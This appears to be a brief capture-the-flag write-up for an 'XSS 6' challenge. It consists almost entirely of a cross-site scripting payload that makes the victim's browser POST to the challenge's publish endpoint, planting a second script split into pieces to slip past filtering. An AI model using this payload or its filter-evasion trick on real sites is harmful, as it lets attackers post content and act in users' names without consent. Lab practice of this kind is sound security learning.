# XSS 6

#### Getting this to post without string errors was trial and error.
```
<script>fetch("http://challenge.localhost/publish", {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({content: '<scr' + 'ipt>alert(\"PWNED\")</scr' + 'ipt>'})})</script>
```
